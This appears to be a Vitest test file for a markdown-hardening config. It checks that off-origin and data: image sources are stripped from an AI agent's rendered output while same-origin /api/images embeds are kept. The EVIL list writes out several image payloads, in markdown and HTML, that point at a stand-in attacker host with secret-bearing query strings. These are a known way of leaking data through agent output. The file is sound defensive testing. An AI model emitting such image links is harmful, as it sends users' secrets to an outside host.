// C1 (79b fix round 1): the hardening config, run through the SAME parser vue-stream-markdown
// uses (createMarkmendParser, re-exported), strips every off-origin image vector.
import { describe, expect, it, vi } from 'vitest'
import { createMarkmendParser } from 'vue-stream-markdown'
import { agentMarkdownHarden } from './markdown-harden'

type Node = string | [string | null, Record<string, unknown>, ...Node[]]
function imgSrcs(nodes: Node[]): (string | undefined)[] {
  const out: (string | undefined)[] = []
  const walk = (ns: Node[]) => {
    for (const n of ns) {
      if (typeof n === 'string' || !Array.isArray(n)) continue
      const [tag, attrs, ...kids] = n
      if (tag === 'img') out.push(attrs?.src as string | undefined)
      walk(kids)
    }
  }
  walk(nodes)
  return out
}
async function parse(md: string, security: Record<string, unknown>) {
  vi.spyOn(console, 'log').mockImplementation(() => {})
  vi.spyOn(console, 'warn').mockImplementation(() => {})
  const doc = await createMarkmendParser({ syntax: { security } } as never).parse(md, 'static')
  return imgSrcs((doc as unknown as { document: { nodes: Node[] } }).document.nodes)
}

// (`/api/images/../x` passes the parser's prefix check verbatim; the image node's render-time
// transform resolves it to `/x` and blocks it — same-origin either way, browser-validated.)
const EVIL = [
  '![a](https://evil.example/p.png?d=secret)',
  '![b][r]\n\n[r]: https://evil.example/ref.png?d=secret',
  '<img src="https://evil.example/html.png?d=secret">',
  '![c](//evil.example/pr.png?d=secret)',
  '![d](http://evil.example/p.png?d=secret)',
  '![f](data:image/png;base64,iVBORw0KGgo=)'
]

describe('agent markdown image hardening (C1)', () => {
  it.each(EVIL)('drops the src of %s', async (md) => {
    const srcs = await parse(md, agentMarkdownHarden)
    for (const s of srcs) expect(s ?? '').not.toMatch(/evil|data:/)
  })

  it('the library default (no hardening) WOULD load the external image — the test is not vacuous', async () => {
    expect(await parse(EVIL[0]!, {})).toEqual(['https://evil.example/p.png?d=secret'])
  })

  it('keeps a server-authored /api/images embed', async () => {
    expect(await parse('![a cat](/api/images/img1/raw)', agentMarkdownHarden)).toEqual(['/api/images/img1/raw'])
  })
})
